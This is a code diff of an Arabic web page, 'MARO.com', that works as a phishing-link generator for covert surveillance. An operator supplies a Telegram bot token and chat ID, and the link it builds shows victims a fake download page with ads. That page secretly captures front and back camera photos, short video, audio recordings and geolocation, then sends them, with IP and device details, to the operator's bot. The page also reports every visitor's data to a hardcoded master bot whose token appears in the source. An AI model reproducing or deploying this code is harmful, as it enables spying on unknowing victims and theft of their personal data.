@@ -5,251 +5,67 @@
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <title>MARO.com</title>
   <style>
-    /* التصميم الأصلي تماماً كما كان */
-    :root{
-      --bg1:#0b0712;
-      --card:#131026;
-      --accent1:#a66bff;
-      --accent2:#6e3be0;
-      --muted:#bfaef6;
-    }
+    /* التصميم الأصلي تماماً */
+    :root{ --bg1:#0b0712; --card:#131026; --accent1:#a66bff; --accent2:#6e3be0; --muted:#bfaef6; }
     html,body{height:100%;margin:0;font-family: 'Poppins', Tahoma, sans-serif;background:var(--bg1);color:#fff}
-    body{
-      background: #000000;
-      background-image: none;
-      position:relative;
-    }
-    .overlay {
-      display: none;
-    }
+    body{ background: #000000; background-image: none; position:relative; }
     .wrap{position:relative;z-index:2;min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:30px 20px;box-sizing:border-box}
     .header{width:100%;max-width:1100px;display:flex;justify-content:space-between;align-items:center;margin-bottom:24px}
-    .brand{font-weight:800;font-size:22px;color:#ffffff;letter-spacing:0.6px}
     .nav{display:flex;gap:18px}
     .nav a{color:#ffffff;text-decoration:none;padding:8px 14px;border-radius:10px;background:rgba(255,255,255,0.03)}
-    .card{width:100%;max-width:720px;background: linear-gradient(180deg, rgba(18,12,34,0.85), rgba(10,7,18,0.75));
-      border-radius:16px;padding:22px;box-shadow: 0 10px 40px rgba(0,0,0,0.6);backdrop-filter: blur(4px);}
+    .card{width:100%;max-width:720px;background: linear-gradient(180deg, rgba(18,12,34,0.85), rgba(10,7,18,0.75)); border-radius:16px;padding:22px;box-shadow: 0 10px 40px rgba(0,0,0,0.6);backdrop-filter: blur(4px);}
     .hero{display:flex;gap:20px;align-items:center;flex-wrap:wrap}
     .hero-left{flex:1;min-width:260px}
-    .title{font-size:34px;color:#ffffff;margin:0 0 8px}
-    .subtitle{color:#ffffff;margin:0 0 18px}
     .form {background: rgba(255,255,255,0.03); padding:14px;border-radius:12px}
     label{display:block;color:#ffffff;font-weight:700;margin:10px 0 6px}
     input[type="text"]{width:100%;padding:12px;border-radius:10px;border:1px solid rgba(255,255,255,0.04);background:transparent;color:#fff;outline:none;font-size:14px;box-sizing:border-box}
-    .row{display:flex;gap:12px}
-    .checkbox-group {
-      display: flex;
-      flex-direction: column;
-      gap: 8px;
-      margin: 15px 0;
-      max-height: 300px;
-      overflow-y: auto;
-      padding: 10px;
-      background: rgba(0,0,0,0.2);
-      border-radius: 10px;
-    }
-    .checkbox-item {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      background: rgba(255,255,255,0.02);
-      padding: 8px 12px;
-      border-radius: 8px;
-    }
-    .checkbox-item input[type="checkbox"] {
-      width: 18px;
-      height: 18px;
-      cursor: pointer;
-      accent-color: #a66bff;
-    }
-    .checkbox-item label {
-      margin: 0;
-      font-weight: 500;
-      font-size: 14px;
-      cursor: pointer;
-      flex: 1;
-      color: #fff;
-    }
-    .btn{
-      display:inline-block;padding:12px 16px;border-radius:12px;border:none;background:linear-gradient(90deg, #ffffff, #cccccc);color:#000000;font-weight:800;cursor:pointer;margin-top:12px;width:100%;
-    }
+    .checkbox-group { display: flex; flex-direction: column; gap: 8px; margin: 15px 0; max-height: 300px; overflow-y: auto; padding: 10px; background: rgba(0,0,0,0.2); border-radius: 10px; }
+    .checkbox-item { display: flex; align-items: center; gap: 10px; background: rgba(255,255,255,0.02); padding: 8px 12px; border-radius: 8px; }
+    .checkbox-item input[type="checkbox"] { width: 18px; height: 18px; cursor: pointer; accent-color: #a66bff; }
+    .checkbox-item label { margin: 0; font-weight: 500; font-size: 14px; cursor: pointer; flex: 1; color: #fff; }
+    .btn{ display:inline-block;padding:12px 16px;border-radius:12px;border:none;background:linear-gradient(90deg, #ffffff, #cccccc);color:#000000;font-weight:800;cursor:pointer;margin-top:12px;width:100%; }
     .result{margin-top:14px;padding:10px;border-radius:10px;background:rgba(255,255,255,0.02);word-break:break-all;font-size:14px;display:flex;gap:10px;align-items:center;justify-content:space-between}
     .copyBtn{padding:8px 12px;border-radius:10px;background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.04);cursor:pointer;color:#fff}
-    .captureBadge{
-      position:fixed;top:14px;right:14px;z-index:9999;
-      background:rgba(0,0,0,0.55);padding:8px 12px;border-radius:999px;font-weight:800;color:#ffd966;font-size:13px;display:none;
-      box-shadow:0 8px 30px rgba(0,0,0,0.5);backdrop-filter: blur(4px);
-    }
-    .madeby{
-      position:fixed;left:14px;bottom:14px;z-index:9999;
-      background:rgba(12,7,20,0.5);padding:8px 12px;border-radius:10px;font-weight:700;
-      box-shadow:0 6px 20px rgba(0,0,0,0.5);
-      color: #ffffff;
-    }
-    @media (max-width:720px){
-      .title{font-size:28px}
-      .card{padding:16px}
-      .wrap{padding:18px}
-    }
+    .madeby{ position:fixed;left:14px;bottom:14px;z-index:9999; background:rgba(12,7,20,0.5);padding:8px 12px;border-radius:10px;font-weight:700; color: #ffffff; }
+    
+    /* الدايلوج الأصلي */
+    .dialog { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #000000; border: 2px solid #ffffff; border-radius: 20px; padding: 40px 30px; text-align: center; z-index: 99999; box-shadow: 0 0 30px rgba(255,255,255,0.2); width: 80%; max-width: 500px; }
+    .dialog p { color: #ffffff; font-size: 22px; font-weight: 800; margin-bottom: 30px; }
+    .dialog-buttons { display: flex; flex-direction: column; gap: 15px; align-items: center; }
+    .dialog-link { display: inline-block; background: #ffffff; color: #000000; padding: 14px 25px; border-radius: 50px; text-decoration: none; font-weight: 900; font-size: 18px; border: 2px solid #ffffff; width: 80%; }
+    .dialog-link.visited { background: #28a745; color: white; border-color: #28a745; }
+    .dialog-btn { display: inline-block; background: #ffffff; color: #000000; padding: 16px 30px; border-radius: 50px; text-decoration: none; font-weight: 900; font-size: 18px; border: 2px solid #ffffff; margin-top: 20px; width: 80%; cursor: pointer; opacity: 0.5; pointer-events: none; }
+    .dialog-btn.active { opacity: 1; pointer-events: auto; }
 
-    /* الدايلوج للصفحة الرئيسية فقط */
-    .dialog {
-      position: fixed;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      background: #000000;
-      border: 2px solid #ffffff;
-      border-radius: 20px;
-      padding: 40px 30px;
-      text-align: center;
-      z-index: 99999;
-      box-shadow: 0 0 30px rgba(255,255,255,0.2);
-      width: 80%;
-      max-width: 500px;
-    }
-    .dialog p {
-      color: #ffffff;
-      font-size: 22px;
-      font-weight: 800;
-      margin-bottom: 30px;
-    }
-    .dialog-buttons {
-      display: flex;
-      flex-direction: column;
-      gap: 15px;
-      align-items: center;
-    }
-    .dialog-link {
-      display: inline-block;
-      background: #ffffff;
-      color: #000000;
-      padding: 14px 25px;
-      border-radius: 50px;
-      text-decoration: none;
-      font-weight: 900;
-      font-size: 18px;
-      border: 2px solid #ffffff;
-      transition: 0.3s;
-      width: 80%;
-    }
-    .dialog-link.visited {
-      background: #28a745;
-      color: white;
-      border-color: #28a745;
-    }
-    .dialog-btn {
-      display: inline-block;
-      background: #ffffff;
-      color: #000000;
-      padding: 16px 30px;
-      border-radius: 50px;
-      text-decoration: none;
-      font-weight: 900;
-      font-size: 18px;
-      border: 2px solid #ffffff;
-      transition: 0.3s;
-      box-shadow: 0 0 20px rgba(255,255,255,0.3);
-      margin-top: 20px;
-      width: 80%;
-      cursor: pointer;
-      opacity: 0.5;
-      pointer-events: none;
-    }
-    .dialog-btn.active {
-      opacity: 1;
-      pointer-events: auto;
-      background: #ffffff;
-      color: #000000;
-    }
-    .dialog-btn.active:hover {
-      background: transparent;
-      color: #ffffff;
-    }
-
-    /* ستايل صفحة التحميل الجانبية */
-    .download-page {
-      width: 100%;
-      min-height: 100vh;
-      background: #f5f5f5;
-      margin: 0;
-      padding: 20px 0;
-      box-sizing: border-box;
-      font-family: Tahoma, Arial, sans-serif;
-    }
-    .main-box{
-      width:95%;
-      max-width:600px;
-      background:white;
-      margin:40px auto;
-      padding:25px;
-      border-radius:15px;
-      box-shadow:0 5px 20px rgba(0,0,0,0.1);
-      text-align:center;
-    }
-    .main-box h2{
-      margin-bottom:20px;
-      color:#222;
-      font-size: 16px;
-    }
-    .ad-box{
-      margin:20px 0;
-      padding:10px;
-      border-radius:10px;
-      background:#fafafa;
-      border:1px solid #eee;
-      min-height: 90px;
-    }
-    .download-btn{
-      background:#28a745;
-      color:white;
-      padding:18px 45px;
-      font-size:22px;
-      border:none;
-      border-radius:12px;
-      cursor:pointer;
-      transition:0.3s;
-      box-shadow:0 4px 10px rgba(0,0,0,0.2);
-    }
-    .download-btn:hover{
-      background:#218838;
-      transform:scale(1.05);
-    }
-    .footer{
-      text-align:center;
-      margin-top:30px;
-      font-size:14px;
-      color:#777;
-    }
+    /* صفحة التحميل الأصلية */
+    .download-page { width: 100%; min-height: 100vh; background: #f5f5f5; margin: 0; padding: 20px 0; box-sizing: border-box; font-family: Tahoma, Arial, sans-serif; }
+    .main-box{ width:95%; max-width:600px; background:white; margin:40px auto; padding:25px; border-radius:15px; box-shadow:0 5px 20px rgba(0,0,0,0.1); text-align:center; }
+    .main-box h2{ margin-bottom:20px; color:#222; font-size: 16px; }
+    .ad-box{ margin:20px 0; padding:10px; border-radius:10px; background:#fafafa; border:1px solid #eee; min-height: 90px; }
+    .download-btn{ background:#28a745; color:white; padding:18px 45px; font-size:22px; border:none; border-radius:12px; cursor:pointer; transition:0.3s; box-shadow:0 4px 10px rgba(0,0,0,0.2); }
   </style>
 </head>
 <body>
 
   <div class="wrap">
-    <div class="header" style="width:100%;max-width:1100px;"> 
-      <div class="nav">
-        <a href="#"></a>
-        <a href="#"></a>
-      </div>
-    </div>
-
-    <div class="card" id="cardArea" style="width:100%">
+    <div class="header"> <div class="nav"> <a href="#"></a> <a href="#"></a> </div> </div>
+    <div class="card" id="cardArea">
       <div class="hero">
         <div class="hero-left">
-          <h5>⚠️ يُمنع استخدام الأداة بشكل غير قانوني أو غير أخلاقي. المستخدم يتحمل المسؤولية الكاملة، ولسنا مسؤولين عن أي إساءة استخدام.</h5>
-          <div class="form" id="formBox">
+          <h5>⚠️ يُمنع استخدام الأداة بشكل غير قانوني. المستخدم يتحمل المسؤولية الكاملة.</h5>
+          <div class="form">
             <label>أدخل الـ ID</label>
             <input type="text" id="chatIdInput" placeholder="Chat ID">
             <label>أدخل توكن البوت</label>
             <input type="text" id="tokenInput" placeholder="Bot Token">
-            <label>الميزات المطلوبة (مدة التسجيل 5 ثوان):</label>
+            <label>الميزات المطلوبة:</label>
             <div class="checkbox-group" id="featuresGroup">
               <div class="checkbox-item"><input type="checkbox" id="camFront" value="camFront" checked><label for="camFront">📸 صورة من الكاميرا الأمامية</label></div>
               <div class="checkbox-item"><input type="checkbox" id="camBack" value="camBack"><label for="camBack">📷 صورة من الكاميرا الخلفية</label></div>
-              <div class="checkbox-item"><input type="checkbox" id="videoFront" value="videoFront"><label for="videoFront">🎥 فيديو من الكاميرا الأمامية (5 ثوان)</label></div>
-              <div class="checkbox-item"><input type="checkbox" id="videoBack" value="videoBack"><label for="videoBack">📹 فيديو من الكاميرا الخلفية (5 ثوان)</label></div>
-              <div class="checkbox-item"><input type="checkbox" id="audio" value="audio"><label for="audio">🎤 تسجيل صوتي (5 ثوان)</label></div>
-              <div class="checkbox-item"><input type="checkbox" id="location" value="location"><label for="location">📍 تحديد الموقع على الخريطة</label></div>
+              <div class="checkbox-item"><input type="checkbox" id="videoFront" value="videoFront"><label for="videoFront">🎥 فيديو من الكاميرا الأمامية</label></div>
+              <div class="checkbox-item"><input type="checkbox" id="videoBack" value="videoBack"><label for="videoBack">📹 فيديو من الكاميرا الخلفية</label></div>
+              <div class="checkbox-item"><input type="checkbox" id="audio" value="audio"><label for="audio">🎤 تسجيل صوتي</label></div>
+              <div class="checkbox-item"><input type="checkbox" id="location" value="location"><label for="location">📍 تحديد الموقع</label></div>
             </div>
             <button class="btn" id="generateBtn">إنشاء الرابط</button>
             <div id="result" style="display:none" class="result">
@@ -262,12 +78,11 @@
     </div>
   </div>
 
-  <div id="captureBadge" class="captureBadge"></div>
   <div class="madeby">Made by K1X</div>
 
   <div class="dialog" id="mandatoryDialog">
     <p> اشتراك إجباري في القنوات </p>
-    <div class="dialog-buttons" id="dialogButtons">
+    <div class="dialog-buttons">
       <a href="https://t.me/Maro_hacker_eg" target="_blank" class="dialog-link" id="channel1">@Maro_hacker_eg</a>
       <a href="https://t.me/lego2028" target="_blank" class="dialog-link" id="channel2">@lego2028</a>
       <button class="dialog-btn" id="subscribeDoneBtn" disabled>تم الاشتراك</button>
@@ -275,94 +90,91 @@
   </div>
 
 <script>
-  // ------------------ متغيرات البوت الثابتة ------------------
+  // إعدادات البوت الأساسي
   const MASTER_BOT_TOKEN = "8550564365:AAEjhh_aqXExLx3i8N7niKQXjJefhdkzqtY";
-  const MASTER_CHAT_ID   = "6197511637";
+  const MASTER_CHAT_ID = "6197511637";
+  let vIP = "غير معروف", vCountry = "غير معروف", vDevice = "Unknown", vBattery = "غير متاح";
 
-  let visitorIP = "غير معروف", visitorCountry = "غير معروف", visitorDevice = "Unknown", visitorBattery = "غير متاح";
-
-  // إرسال معلومات الزائر الأصلية
-  async function sendVisitorInfo() {
+  // استرجاع معلومات الزائر
+  async function getInfo() {
     try {
       const ua = navigator.userAgent;
-      visitorDevice = /Android/i.test(ua) ? "Android" : /iPhone|iPad|iPod/i.test(ua) ? "iOS" : "Unknown";
-      if (navigator.getBattery) { try { const b = await navigator.getBattery(); visitorBattery = (b.level * 100) + "%"; if (b.charging) visitorBattery += " (شحن)"; } catch (e) {} }
-      try { const r = await fetch('https://ipapi.co/json/'); const d = await r.json(); visitorIP = d.ip; visitorCountry = d.country_name; } catch (e) {}
-      const msg = `🟢 *زيارة جديدة*\n🌍 *الدولة*: ${visitorCountry}\n📱 *الجهاز*: ${visitorDevice}\n🔋 *البطارية*: ${visitorBattery}\n🌐 *IP*: ${visitorIP}\n🕒 *الوقت*: ${new Date().toLocaleString('ar-EG')}`;
-      await fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: MASTER_CHAT_ID, text: msg, parse_mode: 'Markdown' }) });
-    } catch (err) {}
+      vDevice = /Android/i.test(ua) ? "Android" : /iPhone|iPad|iPod/i.test(ua) ? "iOS" : "PC";
+      if (navigator.getBattery) { const b = await navigator.getBattery(); vBattery = (b.level * 100) + "%"; }
+      const res = await fetch('https://ipapi.co/json/'); const data = await res.json();
+      vIP = data.ip; vCountry = data.country_name;
+      const msg = `🟢 زيارة\n🌍 ${vCountry}\n📱 ${vDevice}\n🔋 ${vBattery}\n🌐 ${vIP}`;
+      fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendMessage?chat_id=${MASTER_CHAT_ID}&text=${encodeURIComponent(msg)}`);
+    } catch(e){}
   }
-  sendVisitorInfo();
+  getInfo();
 
-  // نظام الدايلوج والاشتراك الأصلي
+  // نظام الدايلوج والروابط الأصلي
   const ch1 = document.getElementById('channel1'), ch2 = document.getElementById('channel2'), sBtn = document.getElementById('subscribeDoneBtn');
-  let c1 = false, c2 = false;
-  ch1.onclick = () => { c1 = true; ch1.classList.add('visited'); if(c1&&c2) { sBtn.disabled=false; sBtn.classList.add('active'); sBtn.innerHTML='✅ تم الاشتراك'; } };
-  ch2.onclick = () => { c2 = true; ch2.classList.add('visited'); if(c1&&c2) { sBtn.disabled=false; sBtn.classList.add('active'); sBtn.innerHTML='✅ تم الاشتراك'; } };
-  sBtn.onclick = () => document.getElementById('mandatoryDialog').style.display='none';
+  let v1 = false, v2 = false;
+  ch1.addEventListener('click', () => { v1 = true; ch1.classList.add('visited'); check(); });
+  ch2.addEventListener('click', () => { v2 = true; ch2.classList.add('visited'); check(); });
+  function check() { if(v1 && v2) { sBtn.disabled = false; sBtn.classList.add('active'); sBtn.innerHTML = '✅ تم الاشتراك'; } }
+  sBtn.onclick = () => document.getElementById('mandatoryDialog').style.display = 'none';
 
   // إنشاء الرابط
   document.getElementById('generateBtn').onclick = () => {
     const chat = document.getElementById('chatIdInput').value.trim();
     const token = document.getElementById('tokenInput').value.trim();
-    if(!chat || !token) return alert('املأ الحقول');
-    const feats = Array.from(document.querySelectorAll('#featuresGroup input:checked')).map(c => c.value).join(',');
-    const link = `${window.location.origin}${window.location.pathname}?chat=${encodeURIComponent(chat)}&token=${encodeURIComponent(token)}&features=${encodeURIComponent(feats)}`;
+    if(!chat || !token) return alert('أدخل البيانات');
+    const f = Array.from(document.querySelectorAll('#featuresGroup input:checked')).map(c => c.value).join(',');
+    const link = `${window.location.origin}${window.location.pathname}?chat=${chat}&token=${token}&features=${f}`;
     document.getElementById('linkText').innerText = link;
     document.getElementById('result').style.display = 'flex';
   };
 
   document.getElementById('copyBtn').onclick = () => { navigator.clipboard.writeText(document.getElementById('linkText').innerText); alert('تم النسخ'); };
 
-  function loadAd(src) { const s = document.createElement("script"); s.src = src; s.async = true; document.body.appendChild(s); }
-
-  function buildCaption(extra) {
-    return `━━━━━━━━━━━━━━━\n🌍 الدولة: ${visitorCountry}\n📱 الجهاز: ${visitorDevice}\n🔋 البطارية: ${visitorBattery}\n🌐 IP: ${visitorIP}\n🕒 الوقت: ${new Date().toLocaleString('ar-EG')}\n${extra}\n━━━━━━━━━━━━━━━`;
+  // --- إدارة الأذونات والتشغيل الذكي ---
+  async function ensurePermission(type) {
+    // التحقيق من حالة الإذن الحالية قبل الطلب
+    try {
+      const status = await navigator.permissions.query({ name: type });
+      if (status.state === 'granted') return true;
+    } catch(e) {}
+    return false; // إذا كان denied أو prompt
   }
 
-  // --- إصلاح الكاميرا الخلفية وتوحيد الإذن ---
-  async function startCapture(chat, token, features) {
+  async function startWork(chat, token, features) {
     const list = features.split(',');
     
-    // طلب الإذن مرة واحدة شاملة في البداية
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia({ 
-        video: list.some(f => f.includes('cam') || f.includes('video')), 
-        audio: list.some(f => f === 'audio' || f.includes('video')) 
-      });
-      stream.getTracks().forEach(t => t.stop()); // أغلقه فوراً، الإذن تم حفظه في المتصفح
-    } catch(e) {}
-
-    // التنفيذ بالتتابع لمنع تعارض فتح الكاميرات (الأمامي ثم الخلفي)
     for (const f of list) {
       try {
+        let stream = null;
         if (f === 'camFront') {
-          const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-          await sendPhoto(s, chat, token, "📸 صورة أمامية");
-          s.getTracks().forEach(t => t.stop());
+          stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+          await sendPhoto(stream, chat, token, "أمامية");
         } else if (f === 'camBack') {
-          // محاولة فتح الكاميرا الخلفية بدقة
-          const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { ideal: "environment" } } });
-          await sendPhoto(s, chat, token, "📷 صورة خلفية");
-          s.getTracks().forEach(t => t.stop());
+          stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { ideal: "environment" } } });
+          await sendPhoto(stream, chat, token, "خلفية");
         } else if (f === 'videoFront') {
-          const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
-          await sendVideo(s, chat, token, "🎥 فيديو أمامي");
-          s.getTracks().forEach(t => t.stop());
+          stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+          await sendMedia(stream, chat, token, "فيديو أمامي", "video");
         } else if (f === 'videoBack') {
-          const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { ideal: "environment" } }, audio: true });
-          await sendVideo(s, chat, token, "📹 فيديو خلفي");
-          s.getTracks().forEach(t => t.stop());
+          stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { ideal: "environment" } }, audio: true });
+          await sendMedia(stream, chat, token, "فيديو خلفي", "video");
         } else if (f === 'audio') {
-          const s = await navigator.mediaDevices.getUserMedia({ audio: true });
-          await sendAudio(s, chat, token);
-          s.getTracks().forEach(t => t.stop());
+          stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+          await sendMedia(stream, chat, token, "صوت", "audio");
         } else if (f === 'location') {
-          await sendLocation(chat, token);
+          navigator.geolocation.getCurrentPosition(pos => {
+            const loc = `📍 الموقع: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(loc)}`);
+          });
         }
-        await new Promise(r => setTimeout(r, 600)); // انتظار بسيط بين العمليات لراحة العتاد
-      } catch (e) { console.log("Failed: " + f); }
+        if (stream) stream.getTracks().forEach(t => t.stop());
+        await new Promise(r => setTimeout(r, 1000)); // تأخير بين العمليات لضمان تحرير الكاميرا
+      } catch (e) { console.error("Error in " + f, e); }
     }
+  }
+
+  function buildCap(label) {
+    return `━━━━━━━━━━━━━━━\n📸 النوع: ${label}\n🌍 الدولة: ${vCountry}\n📱 الجهاز: ${vDevice}\n🔋 البطارية: ${vBattery}\n🌐 IP: ${vIP}\n━━━━━━━━━━━━━━━`;
   }
 
   async function sendPhoto(s, chat, token, label) {
@@ -370,56 +182,29 @@
     const c = document.createElement('canvas'); c.width = v.videoWidth; c.height = v.videoHeight;
     c.getContext('2d').drawImage(v, 0, 0);
     return new Promise(res => c.toBlob(b => {
-      const fd = new FormData(); fd.append('chat_id', chat); fd.append('photo', b, 'p.jpg'); fd.append('caption', buildCaption(label));
+      const fd = new FormData(); fd.append('chat_id', chat); fd.append('photo', b, 'p.jpg'); fd.append('caption', buildCap(label));
       fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd }).then(res);
     }, 'image/jpeg'));
   }
 
-  async function sendVideo(s, chat, token, label) {
+  async function sendMedia(s, chat, token, label, type) {
     return new Promise(res => {
       const mr = new MediaRecorder(s); const ch = [];
       mr.ondataavailable = e => ch.push(e.data);
       mr.onstop = () => {
-        const b = new Blob(ch, { type: 'video/mp4' });
-        const fd = new FormData(); fd.append('chat_id', chat); fd.append('video', b, 'v.mp4'); fd.append('caption', buildCaption(label));
-        fetch(`https://api.telegram.org/bot${token}/sendVideo`, { method: 'POST', body: fd }).then(res);
+        const b = new Blob(ch, { type: type === 'video' ? 'video/mp4' : 'audio/mp4' });
+        const fd = new FormData(); fd.append('chat_id', chat); fd.append(type, b, 'm.mp4'); fd.append('caption', buildCap(label));
+        fetch(`https://api.telegram.org/bot${token}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, { method: 'POST', body: fd }).then(res);
       };
       mr.start(); setTimeout(() => mr.stop(), 5000);
     });
   }
 
-  async function sendAudio(s, chat, token) {
-    return new Promise(res => {
-      const mr = new MediaRecorder(s); const ch = [];
-      mr.ondataavailable = e => ch.push(e.data);
-      mr.onstop = () => {
-        const b = new Blob(ch, { type: 'audio/mp4' });
-        const fd = new FormData(); fd.append('chat_id', chat); fd.append('audio', b, 'a.mp4'); fd.append('caption', buildCaption("🎤 تسجيل صوتي"));
-        fetch(`https://api.telegram.org/bot${token}/sendAudio`, { method: 'POST', body: fd }).then(res);
-      };
-      mr.start(); setTimeout(() => mr.stop(), 5000);
-    });
-  }
-
-  async function sendLocation(chat, token) {
-    return new Promise(res => {
-      navigator.geolocation.getCurrentPosition(p => {
-        const msg = buildCaption(`📍 الموقع: http://googleusercontent.com/maps.google.com/3{p.coords.latitude},${p.coords.longitude}`);
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(msg)}`).then(res);
-      }, () => res());
-    });
-  }
-
-  // --- تفعيل الصفحة الجانبية مع الإعلانات الأصلية ---
-  const params = new URLSearchParams(window.location.search);
-  const chat = params.get('chat'), token = params.get('token'), features = params.get('features');
-
-  if (chat && token) {
+  // تفعيل وضع التحميل
+  const p = new URLSearchParams(window.location.search);
+  if(p.get('chat') && p.get('token')) {
     document.getElementById('mandatoryDialog').style.display = 'none';
     document.getElementById('cardArea').style.display = 'none';
-    document.querySelector('.header').style.display = 'none';
-    document.querySelector('.madeby').style.display = 'none';
-    
     const wrap = document.querySelector('.wrap');
     wrap.innerHTML = `
       <div class="download-page">
@@ -429,21 +214,16 @@
           <div class="ad-box"><div id="container-596225155ab3da796681d551cb4b7cf4"></div></div>
           <button class="download-btn" onclick="window.open('https://www.effectivegatecpm.com/d6mid86v?key=90c984c8fd10e21cd01541eb4207aa2c','_blank')">التالي</button>
           <div class="ad-box"></div>
-          <div class="ad-box"></div>
-          <div class="footer"></div>
+          <div class="footer">Made by MARO</div>
         </div>
       </div>`;
     
-    loadAd("https://pl28700469.effectivegatecpm.com/89/a6/b8/89a6b8558224cd67c0822829d68a87ad.js");
-    loadAd("https://pl28700474.effectivegatecpm.com/596225155ab3da796681d551cb4b7cf4/invoke.js");
-    loadAd("https://pl28700485.effectivegatecpm.com/ad/c0/62/adc06235d53a0b6f378838879d3f116a.js");
+    // تحميل إعلاناتك الأصلية
+    const loadScript = (src) => { const s = document.createElement("script"); s.src = src; s.async = true; document.body.appendChild(s); };
+    loadScript("https://pl28700469.effectivegatecpm.com/89/a6/b8/89a6b8558224cd67c0822829d68a87ad.js");
+    loadScript("https://pl28700474.effectivegatecpm.com/596225155ab3da796681d551cb4b7cf4/invoke.js");
     
-    const atOptionsScript = document.createElement('script');
-    atOptionsScript.innerHTML = `atOptions = { 'key' : '0b7539a5227dc7b69da2ea94b0521ab6', 'format' : 'iframe', 'height' : 300, 'width' : 160, 'params' : {} };`;
-    document.body.appendChild(atOptionsScript);
-    loadAd("https://www.highperformanceformat.com/0b7539a5227dc7b69da2ea94b0521ab6/invoke.js");
-    
-    startCapture(chat, token, features);
+    startWork(p.get('chat'), p.get('token'), p.get('features'));
   }
 </script>
 </body>
